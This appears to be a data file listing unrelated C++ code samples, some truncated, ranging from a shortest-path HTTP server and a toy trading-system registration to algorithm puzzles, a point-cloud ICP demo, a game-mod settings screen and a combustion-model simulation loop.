    "#include <boost/beast/core.hpp>\n#include <boost/beast/http.hpp>\n#include <boost/asio.hpp>\n#include <iostream>\n#include <string>\n#include <unordered_map>\n#include <sstream>\n#include <optional>\n#include <cstdlib>\n#include <thread>\n#include <chrono>\n#include <iomanip>\n#ifdef _WIN32\n#include <windows.h>\n#endif\n#include \"graph_data.h\"\n#include \"Dijkstra.cpp\"\n#include \"loading.cpp\"\n#include \"preprocess.cpp\"\n\nnamespace beast = boost::beast;\nnamespace http = beast::http;\nnamespace net = boost::asio;\nusing namespace std;\nusing tcp = net::ip::tcp;\n\nconst string SEPARATOR = \"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\";\nconst string SUBSEPARATOR = \"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\";\n\n#ifdef _WIN32\nvoid initialize_windows_console()\n{\n    // Enable ANSI escape sequences for Windows console\n    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);\n    DWORD dwMode = 0;\n    GetConsoleMode(hOut, &dwMode);\n    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;\n    SetConsoleMode(hOut, dwMode);\n}\n#endif\n\nstring get_timestamp()\n{\n    auto now = chrono::system_clock::now();\n    auto now_time = chrono::system_clock::to_time_t(now);\n    stringstream ss;\n    ss << put_time(localtime(&now_time), \"[%Y-%m-%d %H:%M:%S]\");\n    return ss.str();\n}\n\n// Helper function for consistent log formatting\nvoid log_message(const string &category, const string &message, bool important = false)\n{\n    cout << get_timestamp() << \" \";\n    if (important)\n    {\n        cout << \"\u2551 \\033[1;32m\" << left << setw(12) << category << \"\\033[0m \u2502 \" << message << endl;\n    }\n    else\n    {\n        cout << \"\u2551 \" << left << setw(12) << category << \" \u2502 \" << message << endl;\n    }\n}\n\n// Load graph data with platform-independent path handling\ngraph_data gdata = load_graph_data(\"USA-roads.csv\");\nunordered_map<int, int> single_neighbors;\n\nstring to_json(int start, int end, const vector<int> &path, long duration)\n{\n    stringstream ss;\n    ss << \"{\\n\"\n       << \"    \\\"start\\\": \" << start << \",\\n\"\n       << \"    \\\"end\\\": \" << end << \",\\n\"\n       << \"    \\\"path\\\": [\";\n\n    for (size_t i = 0; i < path.size(); ++i)\n    {\n        if (i % 10 == 0 && i != 0)\n        {\n            ss << \"\\n        \";\n        }\n        ss << path[i];\n        if (i < path.size() - 1)\n            ss << \", \";\n    }\n\n    ss << \"],\\n\"\n       << \"    \\\"computation_time\\\": \" << duration << \"\\n\"\n       << \"}\";\n\n    return ss.str();\n}\n\nstring to_xml(int start, int end, const vector<int> &path, long duration)\n{\n    stringstream ss;\n    ss << \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\"\n       << \"<response>\\n\"\n       << \"    <start>\" << start << \"</start>\\n\"\n       << \"    <end>\" << end << \"</end>\\n\"\n       << \"    <path>\\n\";\n\n    for (int node : path)\n    {\n        ss << \"        <node>\" << node << \"</node>\\n\";\n    }\n\n    ss << \"    </path>\\n\"\n       << \"    <computation_time>\" << duration << \"</computation_time>\\n\"\n       << \"</response>\";\n\n    return ss.str();\n}\n\nvoid handle_request(const http::request<http::string_body> &req, http::response<http::string_body> &res)\n{\n    cout << SUBSEPARATOR << endl;\n    log_message(\"REQUEST\", \"New request received\", true);\n    log_message(\"PATH\", string(req.target()));\n\n    // Helper function to send error response\n    auto send_error = [&res](http::status status, const string &message)\n    {\n        res.result(status);\n        res.body() = message;\n        res.set(http::field::content_type, \"text/plain\");\n        res.prepare_payload();\n    };\n\n    // Determine response type from Accept header\n    string response_type = \"json\";\n    if (req.find(http::field::accept) != req.end())\n    {\n        string accept_header = req[http::field::accept];\n        if (accept_header.find(\"application/xml\") != string::npos)\n        {\n            response_type = \"xml\";\n        }\n    }\n    log_message(\"FORMAT\", \"Response type: \" + response_type);\n\n    // Validate request method and path\n    if (req.method() != http::verb::get || !req.target().starts_with(\"/path\"))\n    {\n        send_error(http::status::not_found, \"Route not found.\");\n        return;\n    }\n\n    // Parse and validate query parameters\n    string query(req.target().begin(), req.target().end());\n    int start = -1, end = -1;\n    unordered_map<string, string> params;\n\n    if (query.find('?') != string::npos)\n    {\n        query = query.substr(query.find('?') + 1);\n        stringstream ss(query);\n        string token;\n\n        while (getline(ss, token, '&'))\n        {\n            auto pos = token.find('=');\n            if (pos != string::npos)\n            {\n                string key = token.substr(0, pos);\n                string value = token.substr(pos + 1);\n                params[key] = value;\n            }\n        }\n\n        // Parse start and end parameters\n        if (params.find(\"start\") != params.end() && params.find(\"end\") != params.end())\n        {\n            try\n            {\n                start = stoi(params[\"start\"]);\n                end = stoi(params[\"end\"]);\n            }\n         ",
    "#include <bits/stdc++.h>\nusing namespace std;\nbool isValidUsername(const string& username) {\n    if (username.length() < 2 || username.length() > 15) {\n        return false;\n    }\n    for (char ch : username) {\n        if (!isalnum(ch)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nbool askRetry() {\n    char choice;\n    cout << \"Would you like to reenter the information (y/n)? \";\n    cin >> choice;\n    if (choice == 'y' || choice == 'Y') {\n        return true;  // Retry the process\n    }\n    cout << \"Exiting registration process.\" << endl;\n    return false;  // Exit the process\n}\n\nbool isValidPassword(const string& password) {\n    if (password.length() < 8) {\n        return false;\n    }\n    bool hasUpper = false, hasLower = false, hasDigit = false, hasSpecial = false;\n    for (char ch : password) {\n        if (isupper(ch)) hasUpper = true;\n        if (islower(ch)) hasLower = true;\n        if (isdigit(ch)) hasDigit = true;\n        if (ispunct(ch)) hasSpecial = true;\n    }\n    return hasUpper && hasLower && hasDigit && hasSpecial;\n}\n\nbool isValidEmail(const string& email) {\n    const regex pattern(\"^[a-zA-Z0-9_+&*-]+(?:\\\\.[a-zA-Z0-9_+&*-]+)*@(?:[a-zA-Z0-9-]+\\\\.)+[a-zA-Z]{2,7}$\");\n    return regex_match(email, pattern);\n}\n\nbool isValidPhone(const string& phone) {\n    const regex pattern(\"^\\\\+?\\\\d{10}$\");\n    return regex_match(phone, pattern);\n}\n\nclass User {\npublic:\n    User() : username(\"\"), password(\"\"), balance(0.0), email(\"\"), phone(\"\") {}  // Default constructor\n    User(string username, string password, double balance, string email, string phone) \n    : username(username), password(password), balance(balance), email(email), phone(phone) {}\n\n\n    string getUsername() const {\n        return username;\n    }\n\n    void setBalance(double balance) {\n        this->balance = balance;\n    }\n\n    double getBalance() const {\n        return balance;\n    }\n    string getEmail() const {\n        return email;\n    }\n\n    void setEmail(const string& email) {\n        this->email = email;\n    }\n\n    string getPhone() const {\n        return phone;\n    }\n\n    void setPhone(const string& phone) {\n        this->phone = phone;\n    }\n    bool validatePassword(const string& inputPassword) const {\n        return inputPassword == password; // Compare the input password with the stored password\n    }\n    void resetPassword(const string& newPassword) {\n        password = newPassword;\n    }\n\nprivate:\n    string username;\n    string password;\n    double balance;\n    string email;  \n    string phone;\n};\n\nclass Transaction {\npublic:\n    Transaction(string type, double amount) : type(type), amount(amount) {\n        time(&timestamp);\n    }\n\n    void display(long long i) const {\n        string timeStrFormatted = ctime(&timestamp);\n        cout <<i<< \". Transaction Type: \" << type << \", Amount: \" << amount << \", Time: \" << timeStrFormatted;\n    }\n\nprivate:\n    string type;\n    double amount;\n    time_t timestamp;\n};\n\nclass TradingSystem {\npublic:\n    TradingSystem() : currentUser(nullptr) {}\n    \n    void registerUser() {\n        string username, password, email, phone;\n        double initialBalance;\n        while (true) {\n            label1:\n            cout << \"Enter Username: \";\n            cin >> username;\n            if (!isValidUsername(username)) {\n                cout << \"Invalid username. It should be 5-15 characters long and contain only letters and numbers.\\n\";\n                if (askRetry()) goto label1;\n                else {\n                    cout<<\"No Registration done\\n\";\n                    return;\n                } \n            }\n            label2:\n            cout << \"Enter Password: \";\n            cin >> password;\n            if (!isValidPassword(password)) {\n                cout << \"Invalid password. It should contain at least 8 characters, with at least one uppercase letter, one lowercase letter, one digit, and one special character.\\n\";\n                if (askRetry()) goto label2;\n                else {\n                    cout<<\"No Registration done\\n\";\n                    return;\n                }\n            }\n\n            cout << \"Enter Initial Balance: \";\n            cin >> initialBalance;\n\n            label3:\n            cout << \"Enter Email: \";\n            cin >> email;\n            if (!isValidEmail(email)) {\n                cout << \"Invalid email format.\\n\";\n                if (askRetry()) goto label3;\n                else {\n                    cout<<\"No Registration done\\n\";\n                    return;\n                } \n            }\n\n            label4:\n            cout << \"Enter Phone Number: \";\n            cin >> phone;\n            if (!isValidPhone(phone)) {\n                cout << \"Invalid phone number format. It should be a 10-digit number.\\n\";\n                if (askRetry()) goto label4;\n                else {\n                    cout<<\"No Registration done\\n\";\n                    return;\n                }\n            }\n\n            if (users.find(username) != users.end()) {\n      ",
    "#include <iostream>\n#include <vector>\n#include <climits>\nusing namespace std;\n\nvector<int> subsetSum(const vector<int>& nums, int target) {\n    int n = nums.size();\n    \n    // DP tables for sums and products\n    vector<vector<bool>> dp(n + 1, vector<bool>(target + 1, false));\n    vector<vector<long long>> products(n + 1, vector<long long>(target + 1, LLONG_MAX));\n    \n    // Base case: empty subset sums to 0\n    for (int i = 0; i <= n; ++i) {\n        dp[i][0] = true;\n        products[i][0] = 1;  // Product of empty set is 1\n    }\n    \n    // Fill the DP tables\n    for (int i = 1; i <= n; ++i) {\n        for (int j = 0; j <= target; ++j) {\n            // Exclude current number\n            dp[i][j] = dp[i-1][j];\n            if (dp[i-1][j]) {\n                products[i][j] = products[i-1][j];\n            }\n            \n            // Include current number if possible\n            if (j >= nums[i-1] && dp[i-1][j-nums[i-1]]) {\n                dp[i][j] = true;\n                long long newProduct = products[i-1][j-nums[i-1]] == LLONG_MAX ? \n                                     LLONG_MAX : \n                                     products[i-1][j-nums[i-1]] * nums[i-1];\n                                     \n                if (newProduct < products[i][j]) {\n                    products[i][j] = newProduct;\n                }\n            }\n        }\n    }\n    \n    // If no valid subset exists\n    if (!dp[n][target]) {\n        return {};\n    }\n    \n    // Trace back to find the subset with minimum product\n    vector<int> result;\n    int currSum = target;\n    for (int i = n; i > 0 && currSum > 0; --i) {\n        if (currSum >= nums[i-1] && dp[i-1][currSum-nums[i-1]]) {\n            long long productWithCurrent = products[i-1][currSum-nums[i-1]] == LLONG_MAX ? \n                                         LLONG_MAX : \n                                         products[i-1][currSum-nums[i-1]] * nums[i-1];\n            \n            if (productWithCurrent == products[i][currSum]) {\n                result.push_back(nums[i-1]);\n                currSum -= nums[i-1];\n            }\n        }\n    }\n    \n    return result;\n}",
    "// Copyright 2025 Fred Emmott <fred@fredemmott.com>\n// SPDX-License-Identifier: MIT\n#include <catch2/catch_test_macros.hpp>\n#include <catch2/generators/catch_generators.hpp>\n#include <magic_args/magic_args.hpp>\n#include <string>\n\n#ifndef MAGIC_ARGS_SINGLE_FILE\n#include \"magic_args/powershell_style_parsing_traits.hpp\"\n#endif\n\n#include \"output.hpp\"\n\nnamespace TestStyles {\nstruct MyArgs {\n  std::string mString;\n  bool mFlag {false};\n  magic_args::flag mDocumentedFlag {\n    .mHelp = \"This flag is documented\",\n    .mShortName = \"d\",\n  };\n};\n}// namespace TestStyles\nusing namespace TestStyles;\n\nTEST_CASE(\"help, GNU-style\") {\n  std::vector<std::string_view> argv {\"test_app\", GENERATE(\"--help\", \"-?\")};\n  Output out, err;\n  const auto args = magic_args::parse<MyArgs>(argv, {}, out, err);\n  REQUIRE_FALSE(args.has_value());\n  CHECK(args.error() == magic_args::HelpRequested);\n  CHECK(err.empty());\n  CHECK(out.get() == &R\"EOF(\nUsage: test_app [OPTIONS...]\n\nOptions:\n\n      --string=VALUE\n      --flag\n  -d, --documented-flag        This flag is documented\n\n  -?, --help                   show this message\n)EOF\"[1]);\n}\n\nTEST_CASE(\"help, powershell-style\") {\n  std::vector<std::string_view> argv {\"test_app\", \"-Help\"};\n  Output out, err;\n  const auto args\n    = magic_args::parse<MyArgs, magic_args::powershell_style_parsing_traits>(\n      argv, {}, out, err);\n  REQUIRE_FALSE(args.has_value());\n  CHECK(args.error() == magic_args::HelpRequested);\n  CHECK(err.empty());\n  CHECK(out.get() == &R\"EOF(\nUsage: test_app [OPTIONS...]\n\nOptions:\n\n      -String=VALUE\n      -Flag\n  -d, -DocumentedFlag          This flag is documented\n\n  -?, -Help                    show this message\n)EOF\"[1]);\n}\n\n// not testing GNU-style here as that's tested in test.cpp\n\nTEST_CASE(\"args, powershell-style\") {\n  std::vector<std::string_view> argv {\n    \"test_app\",\n    \"-String\",\n    \"stringValue\",\n    \"-Flag\",\n    \"-DocumentedFlag\",\n  };\n  Output out, err;\n  const auto args\n    = magic_args::parse<MyArgs, magic_args::powershell_style_parsing_traits>(\n      argv, {}, out, err);\n  CHECK(out.empty());\n  CHECK(err.empty());\n  REQUIRE(args.has_value());\n  CHECK(args->mString == \"stringValue\");\n  CHECK(args->mFlag);\n  CHECK(args->mDocumentedFlag);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"healthalarmer\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Tree burning\n/*\n2385. Amount of Time for Binary Tree to Be Infected\nhttps://leetcode.com/problems/amount-of-time-for-binary-tree-to-be-infected/description/\n*/\nclass Solution {\npublic:\n    unordered_map<TreeNode*,TreeNode*>parent;\n    void addparent(TreeNode* root){\n        if(!root) return;\n        if(root->left) parent[root->left]=root;\n        if(root->right) parent[root->right]=root;\n        addparent(root->left);\n        addparent(root->right);\n    }\n    int time=0;\n    TreeNode* findstart(TreeNode* root,int start){\n        if(!root) return NULL;\n        if(root->val==start) return root;\n    \n        TreeNode* left=findstart(root->left,start);\n        if(left) return left;\n        TreeNode* right=findstart(root->right,start);\n        if(right) return right;\n        return NULL;\n    }\n    int amountOfTime(TreeNode* root, int start) {\n        addparent(root);\n        TreeNode* s=findstart(root,start);\n        int time=0;\n        queue<TreeNode*>q;\n        unordered_set<TreeNode*>visit;\n        q.push(s);\n        while(!q.empty()){\n            int size=q.size();\n            while(size){\n                TreeNode* node=q.front();\n                q.pop();\n                visit.insert(node);\n                if(node->left!=NULL && !visit.count(node->left)) q.push(node->left);\n                if(node->right!=NULL && !visit.count(node->right)) q.push(node->right);\n                if(parent[node] && !visit.count(parent[node])) q.push(parent[node]);\n                size--;\n            }\n            time++;\n        }\n        return time-1;\n    }\n};",
    "#include <iostream>\n#include <string>\n#include <pcl/io/ply_io.h>\n#include <pcl/point_types.h>\n#include <pcl/registration/icp.h>\n#include <pcl/visualization/pcl_visualizer.h>\n#include <pcl/console/time.h>   // TicToc\n\ntypedef pcl::PointXYZ PointT;\ntypedef pcl::PointCloud<PointT> PointCloudT;\n\nbool next_iteration = false;\n\nvoid print4x4Matrix(const Eigen::Matrix4d & matrix)\n{\n  printf(\"Rotation matrix :\\n\");\n  printf(\"    | %6.3f %6.3f %6.3f | \\n\", matrix(0, 0), matrix(0, 1), matrix(0, 2));\n  printf(\"R = | %6.3f %6.3f %6.3f | \\n\", matrix(1, 0), matrix(1, 1), matrix(1, 2));\n  printf(\"    | %6.3f %6.3f %6.3f | \\n\", matrix(2, 0), matrix(2, 1), matrix(2, 2));\n  printf(\"Translation vector :\\n\");\n  printf(\"t = < %6.3f, %6.3f, %6.3f >\\n\\n\", matrix(0, 3), matrix(1, 3), matrix(2, 3));\n}\n\nvoid keyboardEventOccurred(const pcl::visualization::KeyboardEvent& event, void*)\n{\n  if(event.getKeySym() == \"space\" && event.keyDown())\n    next_iteration = true;\n}\n\nint main(int argc, char* argv[])\n{\n  // The point clouds we will be using\n  PointCloudT::Ptr cloud_in(new PointCloudT);  // Original point cloud\n  PointCloudT::Ptr cloud_tr(new PointCloudT);  // Transformed point cloud\n  PointCloudT::Ptr cloud_icp(new PointCloudT);  // ICP output point cloud\n\n  // Checking program arguments\n if(argc < 2)\n {\n   printf(\"Usage :\\n\");\n   printf(\"\\t\\t%s file.ply number_of_ICP_iterations\\n\", argv[0]);\n   PCL_ERROR(\"Provide one ply file.\\n\");\n   return(-1);\n }\n\n int iterations = 1;  // Default number of ICP iterations\n if(argc > 2)\n   {\n     // If the user passed the number of iteration as an argument\n     iterations = atoi(argv[2]);\n     if(iterations < 1)\n     {\n       PCL_ERROR(\"Number of initial iterations must be >= 1\\n\");\n       return(-1);\n     }\n   }\n\n    pcl::console::TicToc time;\n    time.tic();\n    // Load the file to cloud_in\n  if (pcl::io::loadPLYFile(argv[1], *cloud_in) < 0)\n  {\n    PCL_ERROR(\"Error loading cloud %s.\\n\", argv[1]);\n    return(-1);\n  }\n  std::cout << \"\\nLoaded file \" << argv[1] << \" (\" << cloud_in->size() << \" points) in \" << time.toc() << \" ms\\n\" << std::endl;\n\n\n  // Defining a rotation matrix and translation vector\n  Eigen::Matrix4d transformation_matrix = Eigen::Matrix4d::Identity();\n\n  // A rotation matrix (see https://en.wikipedia.org/wiki/Rotation_matrix)\n  double theta = M_PI / 8;  // The angle of rotation in radians\n  transformation_matrix(0, 0) = std::cos(theta);\n  transformation_matrix(0, 1) = -sin(theta);\n  transformation_matrix(1, 0) = sin(theta);\n  transformation_matrix(1, 1) = std::cos(theta);\n\n  //A translation on Z axis (0.4 meters)\n  transformation_matrix(2, 3) = 0.4;\n  // Display in terminal the transformation matrix\n  std::cout << \"Applying this rigid transformation to: cloud_in -> cloud_icp\" << std::endl;\n  print4x4Matrix(transformation_matrix);\n\n  // Executing the transformation\n  pcl::transformPointCloud(*cloud_in, *cloud_icp, transformation_matrix);\n  *cloud_tr = *cloud_icp;  // We backup cloud_icp into cloud_tr for later use\n\n  // The Iterative Closest Point algorithm\n  time.tic();\n  pcl::IterativeClosestPoint<PointT, PointT> icp;\n  icp.setMaximumIterations(iterations);\n  icp.setInputSource(cloud_icp);\n  icp.setInputTarget(cloud_in);\n  icp.align(*cloud_icp);\n  icp.setMaximumIterations(1);  // We set this variable to 1 for the next time we will call .align () function\n  std::cout << \"Applied \" << iterations << \" ICP iteration(s) in \" << time.toc () << \" ms\" << std::endl;\n\n  if(icp.hasConverged()) {\n    std::cout << \"\\nICP has converged, score is \" << icp.getFitnessScore() << std::endl;\n    std::cout << \"\\nICP transformation \" << iterations << \" : cloud_icp -> cloud_in\" << std::endl;\n    transformation_matrix = icp.getFinalTransformation().cast<double>();\n    print4x4Matrix(transformation_matrix);\n  } else {\n    PCL_ERROR(\"\\nICP has not converged.\\n\");\n    return(-1);\n  }\n\n\n  // Visualization\n  pcl::visualization::PCLVisualizer viewer(\"ICP demo\");\n  // Create two vertically separated viewports\n  int v1(0);\n  int v2(1);\n  viewer.createViewPort(0.0, 0.0, 0.5, 1.0, v1);\n  viewer.createViewPort(0.5, 0.0, 1.0, 1.0, v2);\n  // The color we will be using\n  float bckgr_gray_level = 0.0;  // Black\n  float txt_gray_lvl = 1.0 - bckgr_gray_level;\n  // Original point cloud is white\n  pcl::visualization::PointCloudColorHandlerCustom<PointT> cloud_in_color_h(cloud_in, (int)255*txt_gray_lvl,\n                                            (int)255*txt_gray_lvl, (int)255*txt_gray_lvl);\n  viewer.addPointCloud(cloud_in, cloud_in_color_h, \"cloud_in_v1\", v1);\n  viewer.addPointCloud(cloud_in, cloud_in_color_h, \"cloud_in_v2\", v2);\n\n  // Transformed point cloud is green\n  pcl::visualization::PointCloudColorHandlerCustom<PointT> cloud_tr_color_h(cloud_tr, 20, 180, 20);\n  viewer.addPointCloud(cloud_tr, cloud_tr_color_h, \"cloud_tr_v1\", v1);\n  // ICP aligned point cloud is red\n  pcl::visualization::PointCloudColorHandlerCustom<PointT> cloud_icp_color_h(cloud_icp, 180, 20, 20);\n  viewer.addPointCloud(cloud_icp, cloud_icp_color",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <string>\n\nint applyOperation(int left, int right, char op) {\n    return (op == '+') ? left + right : left * right;\n}\n\nbool evaluateExpression(const std::vector<int>& numbers, const std::vector<char>& operations, int target) {\n    int result = numbers[0];\n    for (size_t i = 0; i < operations.size(); ++i) {\n        result = applyOperation(result, numbers[i + 1], operations[i]);\n    }\n    return result == target;\n}\n\nbool checkEquation(const std::vector<int>& numbers, int target) {\n    size_t n = numbers.size();\n    if (n == 1) {\n        return numbers[0] == target;  // Caso base, solo un n\u00famero\n    }\n\n    // Comprobamos todas las combinaciones posibles de operadores\n    size_t numOps = n - 1;\n    std::vector<char> ops(numOps);\n    std::vector<char> possibleOps = {'+', '*'};\n\n    // Generamos todas las combinaciones posibles de los operadores\n    for (size_t i = 0; i < (1 << numOps); ++i) {\n        for (size_t j = 0; j < numOps; ++j) {\n            ops[j] = possibleOps[(i >> j) & 1];  // Asignamos '+' o '*' dependiendo de la m\u00e1scara\n        }\n\n        // Evaluamos la expresi\u00f3n con esta combinaci\u00f3n de operadores\n        if (evaluateExpression(numbers, ops, target)) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nbool readFile(const std::string& fileName, std::vector<std::string>& lines) {\n    std::ifstream in(fileName);\n    if (!in) {\n        std::cerr << \"Cannot open file \" << fileName << '\\n';\n        return false;\n    }\n\n    std::string line;\n    while (std::getline(in, line)) {\n        lines.push_back(line);\n    }\n    return true;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <input_file>\" << std::endl;\n        return EXIT_FAILURE;\n    }\n\n    std::vector<std::string> lines;\n    if (!readFile(argv[1], lines)) {\n        return EXIT_FAILURE;\n    }\n\n    int totalSum = 0;\n\n    for (const auto& line : lines) {\n        std::istringstream iss(line);\n        int result;\n        iss >> result;  // Leer el valor de prueba\n        iss.ignore(1);  // Ignorar el ':'\n        \n        std::vector<int> ops;\n        int num;\n        while (iss >> num) {\n            ops.push_back(num);\n        }\n\n        // Verificar si la combinaci\u00f3n de operadores puede producir el valor de prueba\n        if (checkEquation(ops, result)) {\n            totalSum += result;\n        }\n    }\n\n    std::cout << \"Total calibration sum: \" << totalSum << '\\n';\n\n    return EXIT_SUCCESS;\n}\n\n",
    "#include \"config.hpp\"\n\n#include \"bsml/shared/BSML-Lite.hpp\"\n#include \"main.hpp\"\n\nvoid DidActivate(HMUI::ViewController* self, bool firstActivation, bool addedToHierarchy, bool screenSystemEnabling) {\n    if (!firstActivation)\n        return;\n\n    auto vertical = BSML::Lite::CreateVerticalLayoutGroup(self);\n    vertical->childControlHeight = false;\n    vertical->childForceExpandHeight = false;\n\n    AddConfigValueSliderIncrement(vertical, getConfig().SaberWidth, 0.01, 0.01, 2);\n    AddConfigValueSliderIncrement(vertical, getConfig().SaberLength, 0.01, 0.01, 2);\n    AddConfigValueToggle(vertical, getConfig().Remove);\n    AddConfigValueSliderIncrement(vertical, getConfig().TrailWidth, 0.01, 0.01, 1);\n    AddConfigValueSliderIncrement(vertical, getConfig().TrailLength, 0.01, 0.01, 2);\n    AddConfigValueIncrementFloat(vertical, getConfig().Opacity, 1, 0.1, 0.1, 1);\n    AddConfigValueToggle(vertical, getConfig().Rainbow);\n    AddConfigValueToggle(vertical, getConfig().Colors);\n    AddConfigValueColorPicker(vertical, getConfig().LeftColor);\n    AddConfigValueColorPicker(vertical, getConfig().RightColor);\n}\n\nstatic constexpr float rainbowTime = defaultTrailLength * 2;\n\ninline float RainbowMod(float val) {\n    float mod = rainbowTime;\n    while (val >= mod)\n        val -= mod;\n    return val;\n}\n\nstatic constexpr std::array<UnityEngine::Color, 6> rainbow = {{{1, 0, 0, 1}, {1, 1, 0, 1}, {0, 1, 0, 1}, {0, 1, 1, 1}, {0, 0, 1, 1}, {1, 0, 1, 1}}};\n\nUnityEngine::Color RainbowManager::ColorAtTime(float time) {\n    time = RainbowMod(time + timeOffset) / rainbowTime;\n    int min = time * rainbow.size();\n    float lerp = (time * rainbow.size()) - min;\n    UnityEngine::Color first = rainbow[min % rainbow.size()];\n    UnityEngine::Color second = rainbow[(min + 1) % rainbow.size()];\n    return UnityEngine::Color::Lerp(first, second, lerp);\n}\n\nvoid RainbowManager::AddTime(float time) {\n    timeOffset = RainbowMod(timeOffset + time);\n}\n",
    "#include <iostream>\n#include <array>\n#include <random>\n#include <cmath>\n#include <chrono> // For timing\n#include \"ffcm2_h2.h\" // Change file name to desired header file\n\nusing Scalar = double;\n\n// Function to scale the elements of the input array randomly\nvoid scale_input(std::array<Scalar, 12>& input) {\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_real_distribution<Scalar> dist(0.5, 1.5); // Random scaling factor between 0.5 and 1.5\n\n    for (auto& element : input) {\n        element *= dist(gen);\n    }\n}\n\nvoid print_state(std::array<Scalar, 11>& output, Scalar time)\n{\n    std::cout << time << \", \";\n\n    for (const auto& val : output)\n    {\n        std::cout <<\",\"<< val;\n    }\n\n    std::cout << std::endl;\n}\n\nvoid append_state(std::array<Scalar, 12>& input, std::array<Scalar, 11>& output)\n{\n    for (int i = 0; i < 11; i++) { input[i] = output[i];}\n}\n\n\nstd::array<Scalar, 11> predict_combustion(const std::array<Scalar, 12>& input) {\n    std::array<Scalar, 12> input_real;\n    for (int i = 0; i < 12; i++) {\n        if (i >= 2 && i < 11) {\n            input_real[i] = (pow(input[i], 0.1) - 1) / 0.1; // Boxcox lambda = 0.1\n        } else {\n            input_real[i] = input[i];\n        }\n    }\n\n    auto model_output = ffcm2_h2<Scalar>(input_real); // Change input to desired features\n\n    std::array<Scalar, 11> output_real;\n    for (int i = 0; i < 11; i++) {\n        output_real[i] = model_output[i] + input_real[i]; // NN outputs change of state properties, transferred to real values\n    }\n\n    std::array<Scalar, 11> output;\n    for (int i = 0; i < 11; i++) {\n        if (i >= 2 && i < 11) {\n            output[i] = pow(output_real[i] * 0.1 + 1, 10.0); // Inverse Boxcox transformation\n        } else {\n            output[i] = output_real[i];\n        }\n    }\n\n    return output;\n}\n\nint main() {\n    std::array<Scalar, 12> input = { \n        1800.0, // Temperature, K \n        5.0, // Pressure, atm \n        0.0, // Mass fraction of 9 species, starts, H \n        0.11190674, // H2 \n        0.0, \n        0.88809326, // O2 \n        0.0, \n        0.0, \n        0.0, \n        0.0, \n        0.0, // Mass fraction, ends, O3 \n        -9.0 // log10(time step, s) \n    }; // State properties at current time\n\n    auto start_time = std::chrono::high_resolution_clock::now();\n    \n    for(int i=0; i<1000; i++)\n    {\n        auto output = predict_combustion(input);\n        print_state(output, pow(10.0, input[11]) * (Scalar(i)+1.0));\n        append_state(input, output);\n    }\n\n    auto end_time = std::chrono::high_resolution_clock::now();\n\n    // Calculate the elapsed time in milliseconds\n    auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time).count();\n\n    // Report the elapsed time\n    std::cout << \"Execution Time: \" << elapsed_time << \" ms\" << std::endl;\n\n\n\n    return 0;\n}\n",
